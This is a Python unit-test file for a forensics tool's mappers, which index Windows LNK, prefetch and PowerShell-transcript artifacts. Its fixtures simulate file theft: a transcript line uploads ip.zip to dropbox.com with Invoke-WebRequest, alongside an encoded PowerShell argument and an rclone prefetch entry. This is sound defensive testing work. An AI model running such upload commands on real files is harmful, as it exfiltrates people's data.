"""Unit tests for the pure per-user-activity mappers (no LnkParse3/pyscca/real files needed).

Covers the LNK, prefetch and PowerShell-transcript pure mappers — the parser-driving
bodies (which need the forensics libs + real evidence) are exercised on the SIFT box.
"""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

from silentwitness_mcp.index._feeder_util import MAX_TEXT
from silentwitness_mcp.index.feeders_lnk import (
    _best_target,
    _iso,
    _lnk_to_record,
    _network_share,
)
from silentwitness_mcp.index.feeders_prefetch import (
    _FILETIME_EPOCH,
    _last_run_times,
    _latest_run_iso,
    _prefetch_to_record,
)
from silentwitness_mcp.index.feeders_pstranscript import (
    _decode,
    _parse_header,
    _start_iso,
    _transcript_to_record,
    pstranscript_records,
)

# --- LNK mapper --------------------------------------------------------------------


def test_iso_accepts_datetime_and_str() -> None:
    assert _iso(datetime(2020, 11, 13, 9, 30, tzinfo=UTC)) == "2020-11-13T09:30:00+00:00"
    assert _iso("2020-11-13T09:30:00") == "2020-11-13T09:30:00"
    assert _iso(None) == ""
    assert _iso("") == ""


def test_best_target_prefers_local_base_with_suffix() -> None:
    link_info = {"local_base_path": "C:\\Users\\fredr\\Projects\\", "common_path_suffix": "ip.docx"}
    assert _best_target({}, link_info) == "C:\\Users\\fredr\\Projects\\ip.docx"


def test_best_target_falls_back_to_relative_path() -> None:
    data = {"relative_path": "..\\..\\secret.zip"}
    assert _best_target(data, {}) == "..\\..\\secret.zip"


def test_network_share_extracted_when_present() -> None:
    link_info = {"common_network_relative_link": {"net_name": "\\\\NAS\\share"}}
    assert _network_share(link_info) == "\\\\NAS\\share"
    assert _network_share({}) == ""
    assert _network_share({"common_network_relative_link": None}) == ""


def test_lnk_to_record_builds_searchable_row() -> None:
    parsed = {
        "data": {
            "command_line_arguments": "-enc ZQBjAGgAbw==",
            "working_directory": "C:\\tmp",
            "machine_identifier": "SRL-WS01",
        },
        "header": {"modified_time": datetime(2020, 11, 13, 9, 30, tzinfo=UTC)},
        "link_info": {"local_base_path": "C:\\Users\\fredr\\ip.docx"},
    }
    record = _lnk_to_record(
        parsed, artifact_path="lnk/ip.lnk", audit_id="a1", host="WS", sha256="s"
    )
    assert record is not None
    assert record.source_tool == "lnk"
    assert "target=C:\\Users\\fredr\\ip.docx" in record.text
    assert "machine=SRL-WS01" in record.text
    assert record.ts == "2020-11-13T09:30:00+00:00"
    assert record.artifact_path == "lnk/ip.lnk"


def test_lnk_to_record_returns_none_without_target_or_share() -> None:
    assert _lnk_to_record({}, artifact_path="x", audit_id="a", host="", sha256="s") is None


def test_lnk_to_record_source_tool_override_for_jumplist() -> None:
    parsed = {"link_info": {"local_base_path": "C:\\f.txt"}}
    record = _lnk_to_record(
        parsed, artifact_path="j#3", audit_id="a", host="", sha256="s", source_tool="jumplist:auto"
    )
    assert record is not None
    assert record.source_tool == "jumplist:auto"


# --- prefetch mapper ---------------------------------------------------------------


def test_latest_run_iso_picks_most_recent() -> None:
    times = [datetime(2020, 11, 1, tzinfo=UTC), datetime(2020, 11, 13, 8, tzinfo=UTC)]
    assert _latest_run_iso(times) == "2020-11-13T08:00:00+00:00"
    assert _latest_run_iso([]) == ""


class _FakeScca:
    """Duck-typed pyscca.file: fixed run-time slots, raising past the available count."""

    def __init__(self, times: list[datetime]) -> None:
        self._times = times

    def get_last_run_time(self, index: int) -> datetime:
        if index >= len(self._times):
            raise OSError("no such run-time slot")
        return self._times[index]


def test_last_run_times_drops_filetime_epoch_sentinels() -> None:
    real = datetime(2020, 11, 14, 4, 49, tzinfo=UTC)
    scca = _FakeScca([real, _FILETIME_EPOCH, _FILETIME_EPOCH])
    assert _last_run_times(scca) == [real]


def test_last_run_times_stops_at_first_refused_slot() -> None:
    a = datetime(2020, 11, 14, 4, tzinfo=UTC)
    b = datetime(2020, 11, 14, 3, tzinfo=UTC)
    assert _last_run_times(_FakeScca([a, b])) == [a, b]


def test_prefetch_to_record_carries_exe_and_files() -> None:
    record = _prefetch_to_record(
        executable="RCLONE.EXE",
        run_count=4,
        last_run_iso="2020-11-13T08:00:00+00:00",
        volumes=["\\DEVICE\\HARDDISKVOLUME2"],
        filenames=["\\VOLUME\\rclone.exe", "\\VOLUME\\ip.docx"],
        pf_path="prefetch/RCLONE.EXE-AABBCCDD.pf",
        audit_id="a1",
        host="WS",
        sha256="s",
    )
    assert record.source_tool == "prefetch"
    assert "exe=RCLONE.EXE" in record.text
    assert "run_count=4" in record.text
    assert "ip.docx" in record.text
    assert record.ts == "2020-11-13T08:00:00+00:00"


def test_prefetch_to_record_caps_text_length() -> None:
    record = _prefetch_to_record(
        executable="X.EXE",
        run_count=1,
        last_run_iso="",
        volumes=[],
        filenames=[f"\\file_{i}.dll" for i in range(10_000)],
        pf_path="p.pf",
        audit_id="a",
        host="",
        sha256="s",
    )
    assert len(record.text) <= MAX_TEXT


# --- PowerShell transcript mapper --------------------------------------------------

_TRANSCRIPT = (
    "**********************\n"
    "Windows PowerShell transcript start\n"
    "Start time: 20201113093000\n"
    "Username: SRL\\fredr\n"
    "RunAs User: SRL\\fredr\n"
    "Machine: SRL-WS01\n"
    "Host Application: powershell.exe\n"
    "**********************\n"
    "PS C:\\> Invoke-WebRequest -Uri https://dropbox.com/upload -InFile ip.zip\n"
)


def test_parse_header_extracts_fields() -> None:
    header = _parse_header(_TRANSCRIPT)
    assert header["Username"] == "SRL\\fredr"
    assert header["Host Application"] == "powershell.exe"
    assert header["Start time"] == "20201113093000"


def test_start_iso_parses_compact_stamp() -> None:
    assert _start_iso("20201113093000") == "2020-11-13T09:30:00"
    assert _start_iso("not-a-time") == ""
    assert _start_iso("2020") == ""


def test_transcript_to_record_indexes_commands() -> None:
    record = _transcript_to_record(
        header=_parse_header(_TRANSCRIPT),
        body=_TRANSCRIPT,
        ps_path="ps/transcript.txt",
        audit_id="a1",
        host="WS",
        sha256="s",
    )
    assert record.source_tool == "powershell:transcript"
    assert "user=SRL\\fredr" in record.text
    assert "dropbox.com/upload" in record.text
    assert record.ts == "2020-11-13T09:30:00"


def test_decode_handles_utf16_bom() -> None:
    raw = _TRANSCRIPT.encode("utf-16")  # adds a BOM
    assert "Invoke-WebRequest" in _decode(raw)


def test_pstranscript_records_drives_a_real_file(tmp_path: Path) -> None:
    path = tmp_path / "PowerShell_transcript.SRL-WS01.abc.20201113093000.txt"
    path.write_text(_TRANSCRIPT, encoding="utf-8")
    records = list(pstranscript_records(path, audit_id="a1", host="WS"))
    assert len(records) == 1
    assert "dropbox.com/upload" in records[0].text
    assert records[0].sha256  # hashed the real bytes
    assert records[0].ts == "2020-11-13T09:30:00"
